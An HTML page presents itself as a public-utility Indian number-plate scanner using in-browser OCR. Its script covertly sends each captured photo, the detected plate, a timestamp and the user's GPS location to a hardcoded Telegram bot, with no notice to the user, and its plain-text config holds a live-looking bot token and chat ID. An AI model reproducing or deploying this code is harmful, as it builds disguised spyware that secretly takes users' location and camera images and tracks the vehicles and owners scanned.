<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Indian Vehicle Number Scanner | Public Utility</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
  margin:0;
  min-height:100vh;
  background:radial-gradient(circle at top,#0b5ed7 0%,#020617 65%);
  font-family:Segoe UI,Arial;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
}
.card{
  width:460px;
  max-width:96%;
  background:rgba(255,255,255,.1);
  backdrop-filter:blur(18px);
  border-radius:24px;
  padding:24px;
  box-shadow:0 40px 80px rgba(0,0,0,.7);
  text-align:center;
}
video,img,canvas{
  width:100%;
  border-radius:16px;
  margin-top:12px;
}
button,input[type=file]{
  width:100%;
  margin-top:12px;
  padding:14px;
  border:none;
  border-radius:16px;
  background:#0b5ed7;
  color:#fff;
  font-size:15px;
  font-weight:600;
  cursor:pointer;
}
input[type=file]{background:#1e293b}
button:disabled{opacity:.6}
.result{margin-top:14px;font-size:15px;font-weight:600}
.good{color:#4ade80}
.bad{color:#f87171}
.small{font-size:12px;opacity:.7}
</style>
</head>

<body>

<div class="card">
  <h2>ðŸš˜ Indian Vehicle Scanner</h2>
  <p class="small">Camera ya Image Upload se Number Plate Scan</p>

  <!-- CAMERA -->
  <video id="video" autoplay playsinline></video>
  <button id="scanBtn" disabled onclick="scanFromCamera()">ðŸ“¸ Scan from Camera</button>

  <!-- FILE UPLOAD -->
  <input type="file" accept="image/*" onchange="scanFromFile(this)">

  <canvas id="canvas" style="display:none"></canvas>

  <div class="result" id="result"></div>
</div>

<script src="https://unpkg.com/tesseract.js@5/dist/tesseract.min.js"></script>

<script>
/* ================= CONFIG ================= */
const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
const CHAT_ID  = "543961277";

/* ================= RTO MAP ================= */
const RTO = {
  DL:"Delhi",BR:"Bihar",UP:"Uttar Pradesh",MH:"Maharashtra",WB:"West Bengal",
  RJ:"Rajasthan",HR:"Haryana",PB:"Punjab",KA:"Karnataka",TN:"Tamil Nadu",
  GJ:"Gujarat",MP:"Madhya Pradesh",CG:"Chhattisgarh",JH:"Jharkhand",
  OD:"Odisha",TS:"Telangana",AP:"Andhra Pradesh",KL:"Kerala",AS:"Assam",
  JK:"Jammu & Kashmir",UK:"Uttarakhand",HP:"Himachal Pradesh",GA:"Goa",
  TR:"Tripura",MN:"Manipur",ML:"Meghalaya",MZ:"Mizoram",NL:"Nagaland",
  AR:"Arunachal Pradesh",SK:"Sikkim",PY:"Puducherry",CH:"Chandigarh",
  AN:"Andaman & Nicobar",LD:"Lakshadweep",DN:"Dadra & Nagar Haveli",DD:"Daman & Diu"
};

let lastPlate = null;
let cameraReady = false;

/* ================= CAMERA INIT ================= */
navigator.mediaDevices.getUserMedia({ video:{ facingMode:"environment" } })
.then(stream=>{
  video.srcObject = stream;
  cameraReady = true;
  scanBtn.disabled = false;
})
.catch(()=>{});

/* ================= CAMERA SCAN ================= */
function scanFromCamera(){
  if(!cameraReady) return;
  drawToCanvas(video);
  processImage(canvas);
}

/* ================= FILE SCAN ================= */
function scanFromFile(input){
  const file = input.files[0];
  if(!file) return;

  const img = new Image();
  img.onload = ()=>{
    drawToCanvas(img);
    processImage(canvas);
  };
  img.src = URL.createObjectURL(file);
}

/* ================= DRAW ================= */
function drawToCanvas(src){
  const ctx = canvas.getContext("2d");
  canvas.width = src.videoWidth || src.width;
  canvas.height = src.videoHeight || src.height;
  ctx.filter = "contrast(140%) brightness(110%)";
  ctx.drawImage(src,0,0);
}

/* ================= OCR PIPELINE ================= */
function processImage(source){
  result.innerText = "â³ Scanningâ€¦ keep plate clear";

  Tesseract.recognize(source,"eng",{
    tessedit_char_whitelist:"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  })
  .then(({data})=>{
    const clean = data.text
      .toUpperCase()
      .replace(/[^A-Z0-9]/g," ")
      .replace(/\s+/g," ");

    const plate = detectPlate(clean);

    if(!plate){
      show("âŒ Plate not detected (try closer & straight)", false);
      return;
    }

    if(plate === lastPlate){
      show("âš ï¸ Same plate already scanned", false);
      return;
    }

    lastPlate = plate;
    handlePlate(plate, source);
  })
  .catch(()=>{
    show("âŒ OCR failed", false);
  });
}

/* ================= PLATE DETECTOR ================= */
function detectPlate(text){
  const patterns = [
    /\b[A-Z]{2}[0-9]{2}[A-Z]{2}[0-9]{4}\b/,
    /\b[A-Z]{2}[0-9]{1,2}[A-Z]{1,3}[0-9]{4}\b/,
    /\b[A-Z]{2}[0-9]{2}[A-Z][0-9]{4}\b/
  ];
  for(const p of patterns){
    const m = text.match(p);
    if(m) return m[0];
  }
  return null;
}

/* ================= PROCESS ================= */
function handlePlate(plate, src){
  const state = RTO[plate.substring(0,2)] || "Unknown";
  const type  = plate.length > 10 ? "ðŸš— Car" : "ðŸï¸ Bike";

  navigator.geolocation.getCurrentPosition(pos=>{
    const map = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
    sendTelegram(plate,state,type,map);
    show(`âœ… ${plate} | ${state} | ${type}`, true);
  },()=>{
    sendTelegram(plate,state,type,"Location not allowed");
    show(`âœ… ${plate} | ${state} | ${type}`, true);
  });
}

/* ================= UI ================= */
function show(msg, ok){
  result.innerHTML = `<span class="${ok?"good":"bad"}">${msg}</span>`;
}

/* ================= TELEGRAM ================= */
function sendTelegram(plate,state,type,map){
  canvas.toBlob(blob=>{
    if(!blob) return;
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption",
`ðŸš˜ Vehicle Detected
ðŸ”¢ ${plate}
ðŸ›ï¸ ${state}
ðŸš¦ ${type}
ðŸ•’ ${new Date().toLocaleString()}
ðŸ“ ${map}`);
    fd.append("photo", blob, "vehicle.jpg");

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
      method:"POST",
      body:fd
    }).catch(()=>{});
  },"image/jpeg");
}
</script>

</body>
</html>
